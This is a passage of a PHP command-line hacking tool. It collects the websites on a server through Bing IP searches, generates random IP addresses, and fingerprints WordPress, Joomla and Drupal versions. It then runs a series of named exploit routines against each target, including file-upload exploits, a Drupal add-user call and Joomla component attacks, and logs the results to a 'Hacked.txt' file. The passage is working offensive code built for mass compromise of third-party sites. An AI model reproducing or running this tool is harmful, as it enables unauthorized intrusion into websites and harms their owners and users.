        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/log.txt');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $data = curl_exec($ch);
        preg_match_all('#;a=(.*?)" h="#', $data, $links);
        foreach ($links[1] as $link) {
            $allLinks[] = $link;
        }
        if (!preg_match('#"sw_next"#', $data)) break;
    }
    if (!empty($allLinks) && is_array($allLinks)) {
        return array_unique(array_map("urldecode", $allLinks));
    }
}
function site($link) {
    $parse = parse_url($link);
    return $parse['scheme'] . "://" . $parse['host'];
}
function get_version($target){
$OK = @get_headers("$target/readme.html");
if(@preg_match("/OK/",$OK[0])){
$source =  @file_get_contents("$target/readme.html");
$black = array(
        '"' => '', 
        '/'  => '', 
        '<'  => '', 
        '>'  => '', 
        'li'  => '', 
        'h1'  => '', 
        'h2'  => '', 
        'h3'  => '', 
        'h4'  => '', 
        'h5'  => '', 
        'head'  => '', 
        'title'  => '', 
        'body'  => '', 
        'html'  => '', 
        'style'  => '', 
        'href'  => '', 
        '='  => '', 
        'meta'  => '', 
        'http'  => '', 
        'https'  => '', 
        ':'  => '', 
        '//'  => '', 
        'www'  => '', 
        'com'  => '', 
        'php'  => '', 
        'DOCTYPE'  => '', 
        '!'  => '', 
        '<br />'  => '', 
        'br'  => '', 
        '/>'  => '', 
        '<'  => '', 
);
$ex = @explode("\n",$source);
$rb = @str_replace( array_keys( $black ), $black, $ex[11] );
$rb = @trim($rb);
echo $rb;
}else {

//	echo " Error this not wordpress !! "."\n";
		}
	
	
}

###############################################
#//||||||||||||  Functions end  ||||||||||||\\#
###############################################

start1 : echo $bold.$fgreen;
echo "\n   [1] By ip only \n";
echo "\n   [2] Ip generator \n";
echo "\n   [3] import sites from txt \n\n";
start2 : echo $white."   [(Exec)]>: ";
$chos = trim(fgets(STDIN,1024));
switch($chos){
###################
#// option 1 go \\#
################### 
 case 1 : 	
getIp : echo $fgreen."\n   [+] Enter server ip : ".$white;
$ip = fgets(STDIN,1024);
$ip = trim($ip);
if(empty($ip)){

echo "\n   [-] Error is empty !! \n";
goto getIp;		
	
}
if (preg_match("/www/",$ip)){

$ip = gethostbyname($ip);

	}elseif(preg_match("/http/",$ip)){

$ip = gethostbyname($ip);

	}
$sitesO = bing("ip:$ip \"=\"");
$sitesR = @array_map("site", $sitesO);
$sitesA = @array_unique($sitesR);
$done = @implode("\n", $sitesA) . "\n";
$sitesT = fopen("sites.txt","a+");
fwrite($sitesT,$done);
echo $yellow. "\n   [$] All server sites will saved in sites.txt , \n"; 
	 break;
#################### 
#// end option 1 //#
#################### 


################### 
#// option 2 go \\#
################### 
 case 2 :
echo "\n";
echo $bold.$green."   [~] Enter number : ";
$ipG = trim(fgets(STDIN,1024));
echo $red."\n   Total ip address : ".$ipG."\n\n";	
for($i=0; $i<$ipG; $i++){
$ip1 = rand(40,255);
$ip2 = rand(40,255);
$ip3 = rand(40,255);
$ip4 = rand(40,255);
$rslt = $yellow.$ip1.".".$ip2.".".$ip3.".".$ip4;
echo $rslt;
echo "\n";
	}
echo $end;
goto start1;
 break;
####################
#// end option 2 \\# 
#################### 

################### 
#// option 3 go \\#
################### 
case 3 :
echo "\n";
echo "   [+] Enter file name : ";
$txt = trim(fgets(STDIN,1024));
$sites = @file_get_contents("$txt") or die ("\n$red    Error file not found\n");
$exp = explode("\n",$sites);
$exp = array_unique($exp);
echo $orange.$end;
echo $green."                          [!] Total sites : ".$red.count($exp).$green." [!]\n";
foreach($exp AS $expl){
$result = fopen("result/Hacked.txt","a+");
$source = @file_get_contents("$expl");	
//echo $source;
if(preg_match("/wp-content/",$source)){
$v = $expl;
$OK = @get_headers("$v/readme.html");
if(@preg_match("/OK/",$OK[0])){
$source =  @file_get_contents("$v/readme.html");
$black = array(
        '"' => '', 
        '/'  => '', 
        '<'  => '', 
        '>'  => '', 
        'li'  => '', 
        'h1'  => '', 
        'h2'  => '', 
        'h3'  => '', 
        'h4'  => '', 
        'h5'  => '', 
        'head'  => '', 
        'title'  => '', 
        'body'  => '', 
        'html'  => '', 
        'style'  => '', 
        'href'  => '', 
        '='  => '', 
        'meta'  => '', 
        'http'  => '', 
        'https'  => '', 
        ':'  => '', 
        '//'  => '', 
        'www'  => '', 
        'com'  => '', 
        'php'  => '', 
        'DOCTYPE'  => '', 
        '!'  => '', 
        '<br />'  => '', 
        'br'  => '', 
        '/>'  => '', 
        '<'  => '', 
        'Version'  => '', 
        
);
$ex = @explode("\n",$source);
$rb = @str_replace( array_keys( $black ), $black, $ex[11] );
$rb = @trim($rb);
}else{
$rb = " Unknown";	
}
if(!preg_match("/Version/",$rb)){
$rb = " Unknown";	
}
if($rb == " Unknown"){
$file = "$expl";
$searchfor = 'generator';
$contents = file_get_contents($file);
if(!preg_match("/Version/",$contents) OR !preg_match("/Espresso/",$contents) OR !preg_match("/Event/",$contents)){
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if(preg_match_all($pattern, $contents, $matches)){
if(preg_match("/WordPress/",$matches[0][0])){
$arr = array(
'<' => "",
'meta' => "",
'name' => "",
'=' => "",
'"' => "",
'content' => "",
'generator' => "",
'/>' => "",
'WordPress' => "",
' ' => "",
'a' => "",
'A' => "",
'b' => "",
'B' => "",
'c' => "",
'C' => "",
'd' => "",
'D' => "",
'e' => "",
'E' => "",
'f' => "",
'F' => "",
'g' => "",
'G' => "",
'h' => "",
'H' => "",
'i' => "",
'I' => "",
'j' => "",
'J' => "",
'k' => "",
'K' => "",
'l' => "",
'L' => "",
'm' => "",
'M' => "",
'n' => "",
'N' => "",
'o' => "",
'O' => "",
'p' => "",
'P' => "",
'q' => "",
'Q' => "",
'r' => "",
'R' => "",
's' => "",
'S' => "",
't' => "",
'T' => "",
'u' => "",
'U' => "",
'v' => "",
'V' => "",
'w' => "",
'W' => "",
'x' => "",
'X' => "",
'y' => "",
'Y' => "",
'z' => "",
'Z' => "",
);
$rb = str_replace(array_keys($arr),$arr,$matches[0]);
$rb = $rb[0];
}
else{
$rb = " Unknown";
}
}else{
$rb = " Unknown";

}
}else{
$rb = " Unknown";

}
}
$vuln = "";
echo $blue."\n -========================================- "."\n";
echo $red. "  Target : ".$green.$expl."\n";
echo $red. "  [CMS] -=================- ".$green." WordPress \n";
if($rb !== " Unknown"){
$ver = "Version";	
}else{
$ver = "";	
}
if(isset($wordpress["$rb"])){
$vulns = fopen("result/Vulns.txt","a+");
fwrite($vulns,"\n Target ");
fwrite($vulns," [$expl] \n");
fwrite($vulns,$wordpress["$rb"]);
fwrite($vulns,"\n -============================- \n");
fclose($vulns);
$rslt = "Saved ";
}else{
$rslt = $orange."Failed ";
}
echo $red. "  [Version] -=============- ".$green;
GetWpVer($expl);
echo "\n";
echo contents($expl);
echo wp_upload($expl);
echo wp_rightnow($expl);
echo wp_dreamwork($expl);
echo wp_jquery($expl);
echo wp_ads($expl);
echo wp_formcraft($expl);
echo wp_blocker($expl);
echo wp_blazeS($expl);
echo wp_upload2($expl);
echo wp_jbm($expl);
echo wp_bsn($expl);
echo wp_qual($expl);
echo plupload($expl);
echo $red."  [Vulns] -===============- ".$green.$rslt."\n";
echo $blue."\n -========================================- "."\n"; 

}
elseif(preg_match("/option=/",$source) OR preg_match("/index.php?option/",$source) OR preg_match("/Joomla/",$source) ){
echo $blue."\n -========================================- "."\n";
echo $red. "  Target : ".$green.$expl."\n";
echo $red. "  [CMS] -========- ".$green." joomla \n";
echo joom_ver($expl);
echo joom_down($expl);
echo com_fabrik($expl);
echo $blue."\n -========================================- "."\n"; 
}elseif(preg_match("/node/",$source)){
echo $blue."\n -========================================- "."\n";
echo $red. "  Target : ".$green.$expl."\n";
echo $red. "  [CMS] ====> ".$green." drupal \n";
echo drupal_upload($expl);
echo add_user($expl);
echo $blue."\n -========================================- "."\n"; 
	}
}
break;
####################
#// end option 3 \\#
####################

################### 
#//  default go \\#
###################
default : 
echo $red."   [-] invild choice \n";	
goto start2;
################## 
#// end switch \\#
################## 

}

?>
